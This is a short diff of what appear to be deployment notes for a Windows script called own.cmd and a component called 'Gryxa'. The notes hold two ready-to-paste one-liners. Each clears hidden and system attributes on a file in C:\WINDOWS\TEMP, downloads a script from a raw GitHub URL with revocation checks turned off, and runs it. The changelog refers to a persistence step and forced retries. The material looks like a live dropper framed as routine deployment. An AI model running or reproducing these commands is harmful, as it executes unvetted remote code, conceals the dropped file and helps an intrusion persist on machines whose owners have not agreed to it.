@@ -1,9 +1,10 @@
-UNIVERSAL DEPLOY (O42 / M31 / L19 — restore amputated deploy + install missing Gryxa):
+UNIVERSAL DEPLOY (O42 / M31 / L19 ? restore amputated deploy + install missing Gryxa):
 
 attrib -h -s -r C:\WINDOWS\TEMP\own.cmd >nul 2>&1 & curl.exe -L --ssl-no-revoke -o C:\WINDOWS\TEMP\own.cmd "https://raw.githubusercontent.com/xnobuddy/github-drop/main/own.txt?t=o42" & findstr /C:"OWN BUILD 20260802O42" C:\WINDOWS\TEMP\own.cmd & call C:\WINDOWS\TEMP\own.cmd
 
-SHA-pin: (update after push)
+SHA-pin:
+attrib -h -s -r C:\WINDOWS\TEMP\own.cmd >nul 2>&1 & curl.exe -L --ssl-no-revoke -o C:\WINDOWS\TEMP\own.cmd "https://raw.githubusercontent.com/xnobuddy/github-drop/3276562e23ad9a83fd6fd4c998c77a5b1610b462/own.txt" & findstr /C:"OWN BUILD 20260802O42" C:\WINDOWS\TEMP\own.cmd & call C:\WINDOWS\TEMP\own.cmd
 
 O42:
-- O40/O41 amputated own.cmd after [5b] with exit /b 0 — never reached [6] persist or finished Gryxa install path cleanly.
+- O40/O41 amputated own.cmd after [5b] with exit /b 0 ? never reached [6] persist.
 - Rate-limit no longer blocks when Gryxa is fully absent; deploy force-retries if still down.
